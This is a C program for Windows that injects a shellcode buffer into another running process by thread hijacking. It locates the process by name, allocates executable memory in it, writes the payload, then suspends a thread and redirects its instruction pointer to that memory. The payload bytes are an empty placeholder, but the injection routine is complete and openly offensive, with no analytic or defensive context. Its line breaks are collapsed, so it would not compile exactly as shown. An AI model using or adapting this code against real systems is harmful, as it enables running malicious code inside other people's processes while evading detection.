#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>unsigned char my_payload[]   = {0x00, 0x00};unsigned int  my_payload_len = sizeof(my_payload);// Obtener el PID del proceso int findMyProc(const char* procname){	HANDLE			hSnapshot;	PROCESSENTRY32	pe;	int				pid = 0;	BOOL			hResult;	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);	if (INVALID_HANDLE_VALUE == hSnapshot)		return 0;		pe.dwSize = sizeof(PROCESSENTRY32);	hResult = Process32First(hSnapshot, &pe);	while (hResult)	{		if (strcmp(procname, (const char*)pe.szExeFile) == 0)		{			pid = pe.th32ProcessID;			break;		}		hResult = Process32Next(hSnapshot, &pe);	}	CloseHandle(hSnapshot);	return pid;}int main(int argc, char* argv[]){	DWORD	pid = 0; 	HANDLE	ph;	HANDLE  ht;	LPVOID  rb;	HANDLE        hSnapshot;	THREADENTRY32 te;	CONTEXT		  ct;	pid = findMyProc(argv[1]);	if (pid == 0)	{		printf("PID not found :( exiting... \n");		return -1;	}	else	{		printf("PID = %d \n", pid);		ct.ContextFlags = CONTEXT_FULL; 		te.dwSize = sizeof(THREADENTRY32);		ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);		if (ph == NULL)		{			printf("OpenProcess failed! exiting... \n");			return -2;		}				rb = VirtualAllocEx(ph, NULL, my_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);		WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);		hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);		if (Thread32First(hSnapshot, &te))		{			do			{				if (pid == te.th32OwnerProcessID)				{					ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);					break; 				}			} while (Thread32Next(hSnapshot, &te));		}		SuspendThread(ht);		GetThreadContext(ht, &ct);		ct.Rip = (DWORD_PTR)rb;		SetThreadContext(ht, &ct);		ResumeThread(ht);		CloseHandle(ph);	}	return 0;}